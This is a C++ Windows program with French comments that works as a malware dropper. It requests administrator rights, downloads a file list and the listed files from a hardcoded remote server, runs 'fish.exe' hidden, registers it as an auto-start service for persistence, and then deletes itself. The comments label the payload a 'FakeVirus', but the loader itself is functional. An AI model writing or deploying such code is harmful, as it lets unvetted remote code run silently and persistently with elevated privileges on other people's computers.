#include <windows.h>
#include <shlobj.h>  // SHGetFolderPath
#include <wininet.h> // Téléchargement HTTP
#include <string>
#include <vector>
#include <fstream>
#include <iostream>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib") // Pour créer le service

using namespace std;

const string SERVER_URL = "https://arthur.xn--pruvost-rivire-6jb.fr/cdn/";
const string FILE_LIST = "files.txt"; // Fichier contenant la liste des fichiers à télécharger


void RequestAdminPrivileges() {
    // Vérifie si le programme tourne déjà en mode admin
    BOOL isAdmin = FALSE;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID pAdminGroup;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdminGroup)) {
        CheckTokenMembership(NULL, pAdminGroup, &isAdmin);
        FreeSid(pAdminGroup);
    }

    if (!isAdmin) {
        // Relance le programme avec les droits admin
        TCHAR szPath[MAX_PATH];
        GetModuleFileName(NULL, szPath, MAX_PATH);

        SHELLEXECUTEINFO sei = { sizeof(sei) };
        sei.lpVerb = TEXT("runas");  // Demande les droits administrateur
        sei.lpFile = szPath;
        sei.hwnd = NULL;
        sei.nShow = SW_SHOWDEFAULT;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;

        if (!ShellExecuteEx(&sei)) {
            MessageBox(NULL, TEXT("Échec de l'obtention des droits administrateur !"), TEXT("Erreur"), MB_OK);
            exit(1);
        }
        exit(0);
    }
}

// Fonction pour obtenir le dossier utilisateur
string GetUserFolderPath() {
    char path[MAX_PATH];
    if (SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path) == S_OK) {
        return string(path);
    }
    return "";
}

// Fonction pour télécharger un fichier depuis une URL
bool DownloadFile(const string& url, const string& localPath) {
    HINTERNET hInternet = InternetOpen("Installer", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    HINTERNET hUrl = InternetOpenUrl(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return false;
    }

    char buffer[4096];
    DWORD bytesRead;
    HANDLE hFile = CreateFile(localPath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile == INVALID_HANDLE_VALUE) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInternet);
        return false;
    }

    while (InternetReadFile(hUrl, buffer, sizeof(buffer), &bytesRead) && bytesRead > 0) {
        DWORD bytesWritten;
        WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL);
    }

    CloseHandle(hFile);
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return true;
}

// Fonction pour lire la liste des fichiers depuis files.txt
vector<string> GetFileList(const string& filePath) {
    vector<string> fileList;
    ifstream file(filePath);
    string line;
    while (getline(file, line)) {
        fileList.push_back(line);
    }
    return fileList;
}

// Fonction pour exécuter un fichier
void ExecuteFile(const string& filePath) {
    ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
}

// Fonction pour s'auto-supprimer
void SelfDelete() {
    char cmd[MAX_PATH];
    GetModuleFileName(NULL, cmd, MAX_PATH);
    string deleteCmd = "cmd /c timeout 2 & del \"" + string(cmd) + "\"";
    system(deleteCmd.c_str());
}

// Fonction pour installer un service Windows
bool InstallService(const string& serviceName, const string& exePath) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return false;

    SC_HANDLE hService = CreateService(
        hSCManager, serviceName.c_str(), serviceName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        exePath.c_str(), NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

int main() {

    RequestAdminPrivileges();

    string userFolder = GetUserFolderPath();
    if (userFolder.empty()) {
        MessageBox(NULL, "Impossible d'obtenir le dossier utilisateur.", "Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    string fishFolder = userFolder + "\\fish";
    CreateDirectory(fishFolder.c_str(), NULL);

    // Télécharger la liste des fichiers
    string fileListPath = fishFolder + "\\" + FILE_LIST;
    if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
        MessageBox(NULL, "Échec du téléchargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    // Lire la liste des fichiers
    vector<string> filesToDownload = GetFileList(fileListPath);

    // Télécharger chaque fichier listé
    for (const string& file : filesToDownload) {
        string url = SERVER_URL + file;
        string localPath = fishFolder + "\\" + file;
        if (!DownloadFile(url, localPath)) {
            MessageBox(NULL, ("Échec du téléchargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
        }
    }

    // Lancer FakeVirus.exe
    string fakeVirusPath = fishFolder + "\\fish.exe";
    ExecuteFile(fakeVirusPath);

    // Installer le service Windows
    InstallService("fish", fakeVirusPath);

    // S'auto-supprimer
    SelfDelete();

    return 0;
}